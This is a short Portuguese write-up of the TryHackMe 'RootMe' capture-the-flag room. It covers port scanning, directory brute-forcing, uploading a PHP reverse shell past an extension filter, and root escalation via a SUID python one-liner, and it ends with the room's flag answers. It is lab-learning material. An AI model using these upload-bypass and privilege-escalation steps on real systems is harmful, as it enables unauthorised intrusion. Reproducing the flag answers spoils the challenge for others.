CTF ROOTME

Ao ver o ip precisavamos dar um nmap para ver 

    sudo nmap -sS "ip"
    
verificando assim, que tinham duas portas abertas ssh 22 e apache 80 http 
para verificar a versao do apache:

    sudo nmap -sV -p80 "ip"

apos entregar essas flags tinhamos que usar a ferramenta Gobuster com a wordlista "common.txt"

    gobuster dir -u http://10.10.136.202/ -w /usr/share/dirb/wordlists/common.txt 

assim encontrando o diretorio /panel/ ao acessar esse diretorio tinha uma opcao para enviar um arquivo, ao procurar um reverseshell para enviar um arquivo PHP encontrava-se um .php que dava acesso ao servidor, ao configurar o arquivo nao era possivel enviar um ".php" e apenas mudando para ".php5" era possivel enviar o arquivo e criando uma porta para o meu terminal

    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

ao entrar no servidor dei o seguinte comando em python:

    python -c "import pty;pty.spawn('/bin/bash')"

para acessar a raiz dei o comando:

     cd ~

encontrava-se o arquivo user.txt, ao dar cat user.txt 

    THM{y0u_g0t_a_sh3ll}

agora a gente precisava da permissao root pelas flags ele informou o SUID e ao procurar o arquivo "diferente" era possivel encontrar o 

    /usr/bin/python

ao acessar o site gtfobins procurava o python SUID e executava o comando 

    ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

assim sendo possivel acessar a pasta root e capturando a ultima flag

    THM{pr1v1l3g3_3sc4l4t10n}


capturando todas as flags do desafio RootMe

FLAGS

    Flag 1: 2
    Flag 2: 2.4.29
    Flag 3: ssh
    Flag 4: /panel/
    Flag 5: THM{y0u_g0t_a_sh3ll}
    Flag 6: /usr/bin/python
    Flag 7: THM{pr1v1l3g3_3sc4l4t10n}



